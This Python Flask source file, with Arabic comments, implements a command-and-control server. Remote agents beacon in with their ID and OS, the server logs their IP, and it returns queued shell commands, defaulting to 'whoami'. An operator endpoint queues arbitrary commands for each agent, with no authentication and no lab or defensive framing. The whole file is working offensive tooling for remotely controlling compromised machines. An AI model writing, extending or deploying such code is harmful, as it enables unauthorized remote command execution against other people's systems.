from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
agents = {} # لتخزين السيرفرات المتصلة
commands = {} # لتخزين الأوامر المرسلة لكل عميل

@app.route('/')
def dashboard():
    return render_template('index.html', agents=agents)

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    agent_id = data['id']
    agents[agent_id] = {
        "ip": request.remote_addr, 
        "os": data['os'], 
        "last_seen": request.date,
        "status": "Online"
    }
    
    # التحقق مما إذا كان هناك أمر ينتظر العميل
    cmd = commands.get(agent_id, "whoami") # الافتراضي whoami إذا لم يوجد أمر
    if agent_id in commands: del commands[agent_id] # حذف الأمر بعد إرساله
    
    return jsonify({"command": cmd})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data['id']
    cmd = data['command']
    commands[agent_id] = cmd
    return jsonify({"status": "Command Queued"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)